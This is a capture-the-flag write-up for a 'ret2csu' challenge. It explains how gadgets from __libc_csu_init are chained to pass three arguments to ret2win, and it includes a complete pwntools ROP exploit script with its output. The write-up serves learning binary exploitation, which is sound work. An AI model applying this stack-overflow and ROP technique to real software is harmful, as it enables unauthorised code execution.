# Writeup: ret2csu

## Introduction

The challenge description states that this challenge is almost identical to the callme challenge except that it does not have many gadgets to work with meaning we will have to find another way to pass the correct arguments to ret2win. As the title suggests we can use the ret2csu strategy to obtain the gadgets necessary to pass the correct arguments to ret2win. ret2csu is a strategy that involves using the init csu function located in the binary to grab the necessary gadgets to complete our ROP chain. Below is the disassembled ret2csu funciton.

```
    objdump -d ./ret2csu -M intel | grep -A 40 "__libc_csu_init"
    0000000000400640 <__libc_csu_init>:
    400640:       41 57                   push   r15
    400642:       41 56                   push   r14
    400644:       49 89 d7                mov    r15,rdx
    400647:       41 55                   push   r13
    400649:       41 54                   push   r12
    40064b:       4c 8d 25 9e 07 20 00    lea    r12,[rip+0x20079e]        # 600df0 <__frame_dummy_init_array_entry>
    400652:       55                      push   rbp
    400653:       48 8d 2d 9e 07 20 00    lea    rbp,[rip+0x20079e]        # 600df8 <__do_global_dtors_aux_fini_array_entry>
    40065a:       53                      push   rbx
    40065b:       41 89 fd                mov    r13d,edi
    40065e:       49 89 f6                mov    r14,rsi
    400661:       4c 29 e5                sub    rbp,r12
    400664:       48 83 ec 08             sub    rsp,0x8
    400668:       48 c1 fd 03             sar    rbp,0x3
    40066c:       e8 5f fe ff ff          call   4004d0 <_init>
    400671:       48 85 ed                test   rbp,rbp
    400674:       74 20                   je     400696 <__libc_csu_init+0x56>
    400676:       31 db                   xor    ebx,ebx
    400678:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
    40067f:       00
    400680:       4c 89 fa                mov    rdx,r15
    400683:       4c 89 f6                mov    rsi,r14
    400686:       44 89 ef                mov    edi,r13d
    400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
    40068d:       48 83 c3 01             add    rbx,0x1
    400691:       48 39 dd                cmp    rbp,rbx
    400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
    400696:       48 83 c4 08             add    rsp,0x8
    40069a:       5b                      pop    rbx
    40069b:       5d                      pop    rbp
    40069c:       41 5c                   pop    r12
    40069e:       41 5d                   pop    r13
    4006a0:       41 5e                   pop    r14
    4006a2:       41 5f                   pop    r15
    4006a4:       c3                      ret
    4006a5:       90                      nop
    4006a6:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
    4006ad:       00 00 00
```

The gadgets that we will be using are as follows.

```
    400680:       4c 89 fa                mov    rdx,r15
    400683:       4c 89 f6                mov    rsi,r14
    400686:       44 89 ef                mov    edi,r13d
    400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
    40068d:       48 83 c3 01             add    rbx,0x1
    400691:       48 39 dd                cmp    rbp,rbx
    400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
    400696:       48 83 c4 08             add    rsp,0x8
    40069a:       5b                      pop    rbx
    40069b:       5d                      pop    rbp
    40069c:       41 5c                   pop    r12
    40069e:       41 5d                   pop    r13
    4006a0:       41 5e                   pop    r14
    4006a2:       41 5f                   pop    r15
``` 
As you can see we can populate the rdx and rsi registers with the second and third arguments and then we can set rbx to 0 and rbp to 1 so that when rbp and rbx are compared they are equal meaning that the loop will stop. We can set rdx and rsi by setting r14 and r15. and then moving the r14 and r15 registers into rdx and rdi respectively. That leaves rdi. We can't set rdi using any of the gadgets here because we need the full 64 bits to pass the correct argument to ret2win. That means that we will have to set rdx and rsi and then set rdi using another gadget which exists in the binary.

`0x00000000004006a3 : pop rdi ; ret`

The last problem that we run into using these gadgets is that we have a call instruction that we cannot avoid so we need to set rdx and rsi and set r12 to a function that is inside the binary. At first I thought that I could just call ret2win prematurely and then call it later, but if we call ret2win with the wrong arguments passed into it the program will exit before we have a chance to complete our chain. Below is a partial disassembly of the ret2win function so you can see what happens when you call ret2win with incorrect arguments.

```
Dump of assembler code for function ret2win:
   0x00000000000009d3 <+0>:     push   rbp
   0x00000000000009d4 <+1>:     mov    rbp,rsp
   0x00000000000009d7 <+4>:     sub    rsp,0x30
   0x00000000000009db <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00000000000009df <+12>:    mov    QWORD PTR [rbp-0x20],rsi
   0x00000000000009e3 <+16>:    mov    QWORD PTR [rbp-0x28],rdx
   0x00000000000009e7 <+20>:    mov    QWORD PTR [rbp-0x10],0x0
   0x00000000000009ef <+28>:    movabs rax,0xdeadbeefdeadbeef
   0x00000000000009f9 <+38>:    cmp    QWORD PTR [rbp-0x18],rax
   0x00000000000009fd <+42>:    jne    0xada <ret2win+263>
   0x0000000000000a03 <+48>:    movabs rax,0xcafebabecafebabe
   0x0000000000000a0d <+58>:    cmp    QWORD PTR [rbp-0x20],rax
   0x0000000000000a11 <+62>:    jne    0xada <ret2win+263>
   0x0000000000000a17 <+68>:    movabs rax,0xd00df00dd00df00d
   0x0000000000000a21 <+78>:    cmp    QWORD PTR [rbp-0x28],rax
   0x0000000000000a25 <+82>:    jne    0xada <ret2win+263>
   0x0000000000000a2b <+88>:    lea    rsi,[rip+0x2ee]        # 0xd20
   0x0000000000000a32 <+95>:    lea    rdi,[rip+0x2e9]        # 0xd22
   0x0000000000000a39 <+102>:   call   0x830 <fopen@plt>
   0x0000000000000a3e <+107>:   mov    QWORD PTR [rbp-0x10],rax
   0x0000000000000a42 <+111>:   cmp    QWORD PTR [rbp-0x10],0x0
   0x0000000000000a47 <+116>:   jne    0xa5f <ret2win+140>
   0x0000000000000a49 <+118>:   lea    rdi,[rip+0x2e8]        # 0xd38
   0x0000000000000a50 <+125>:   call   0x7a0 <puts@plt>
   0x0000000000000a55 <+130>:   mov    edi,0x1
   0x0000000000000a5a <+135>:   call   0x840 <exit@plt>
```

That leaves us to figure out where we should jump to before setting rdi to the correct value. To do this we are going to examine the dynamic section of the binary to see if there are any functions that we could use. Note: we know that any address that starts with 0x004... is within the range of addresses that the binary uses.  

```
    gef➤  x/30x &_DYNAMIC
    0x600e00:       0x00000001      0x00000000      0x00000001      0x00000000
    0x600e10:       0x00000001      0x00000000      0x00000038      0x00000000
    0x600e20:       0x0000001d      0x00000000      0x00000078      0x00000000
    0x600e30:       0x0000000c      0x00000000      0x004004d0      0x00000000
    0x600e40:       0x0000000d      0x00000000      0x004006b4      0x00000000
    0x600e50:       0x00000019      0x00000000      0x00600df0      0x00000000
    0x600e60:       0x0000001b      0x00000000      0x00000008      0x00000000
    0x600e70:       0x0000001a      0x00000000
```

As you can see there are two addresses that fit the description so now all we have to do is to disassemble both to see which one we should choose.

```
    gef➤  disas 0x004004d0
    Dump of assembler code for function _init:
       0x00000000004004d0 <+0>:     sub    rsp,0x8
       0x00000000004004d4 <+4>:     mov    rax,QWORD PTR [rip+0x200b1d]        # 0x600ff8
       0x00000000004004db <+11>:    test   rax,rax
       0x00000000004004de <+14>:    je     0x4004e2 <_init+18>
       0x00000000004004e0 <+16>:    call   rax
       0x00000000004004e2 <+18>:    add    rsp,0x8
       0x00000000004004e6 <+22>:    ret
    End of assembler dump.
    gef➤  disas 0x004006b4
    Dump of assembler code for function _fini:
       0x00000000004006b4 <+0>:     sub    rsp,0x8
       0x00000000004006b8 <+4>:     add    rsp,0x8
       0x00000000004006bc <+8>:     ret
    End of assembler dump.
```

Since the fini function is shorter I will go with that one. To figure out what to set r12 we have to dereference the address ourselves because that is what the call instruction does in the csu init function.

```
    gef➤  search-pattern 0x004006b4
    [+] Searching '\xb4\x06\x40\x00' in memory
    [+] In '/mnt/c/Users/18506/Desktop/CTF/ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
      0x4003b0 - 0x4003c0  →   "\xb4\x06\x40\x00[...]"
      0x400e48 - 0x400e58  →   "\xb4\x06\x40\x00[...]"
    [+] In '/mnt/c/Users/18506/Desktop/CTF/ret2csu/ret2csu'(0x600000-0x601000), permission=r--
      0x6003b0 - 0x6003c0  →   "\xb4\x06\x40\x00[...]"
      0x600e48 - 0x600e58  →   "\xb4\x06\x40\x00[...]"
```

The only address that falls within the dynamic section range is 0x600e48 meaning that is the address that we will want to use to jump to the fini function.

## Results

Now that we have all of the gadgets necessary to pass the correct arguments to ret2win we can now write the script. The execution flow will go as follows: pop 0 into rbx and 1 into rbp, next pop the address that points to the fini function into r12 so we can jump to a safe area in the binary without exiting the program prematurely, pass 0 (junk) into r13 since we can't pass the full value at this point, pass the correct arguments to both r14 and r15 respectively (later they will be passed into rsi and rdx), next we move r15 into rdx, r14 into rsi, the junk in r13 gets moved into rdi and we jump to the fini function, finally we can pop the correct value into rdi and call the ret2win function allowing us to obtain the flag. Below is the script.

```
    from pwn import *

    p = process('./ret2csu')
    e = ELF('./ret2csu')

    ret2win_plt = e.plt['ret2win']

    p.recvuntil(b'> ')
    gadget1 = 0x40069a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    gadget2 = 0x400680 # mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call   QWORD PTR [r12+rbx*8]
    arg1 = 0xdeadbeefdeadbeef
    arg2 = 0xcafebabecafebabe
    arg3 = 0xd00df00dd00df00d
    POP_RDI = 0x00000000004006a3 # pop rdi ; ret
    CALL = 400689 # call   QWORD PTR [r12+rbx*8]
    padding = b'A' * 40

    payload  = padding
    payload += p64(gadget1)
    payload += p64(0)
    payload += p64(1)
    payload += p64(0x600e48)   # pointer that points to the fini function
    payload += p64(0)
    payload += p64(arg2)
    payload += p64(arg3)
    payload += p64(gadget2)
    payload += p64(0) * 7
    payload += p64(POP_RDI)
    payload += p64(arg1)
    payload += p64(ret2win_plt)

    p.sendline(payload)
    p.interactive()
```

Now we run it.

```
    [+] Starting local process './ret2csu': pid 82228
    [*] '/mnt/c/Users/18506/Desktop/CTF/ret2csu/ret2csu'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [*] '/mnt/c/Users/18506/Desktop/CTF/ret2csu/libret2csu.so'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './ret2csu' stopped with exit code 0 (pid 82228)
    [*] Got EOF while sending in interactive
```
And we have the flag!

`ROPE{a_placeholder_32byte_flag!}`


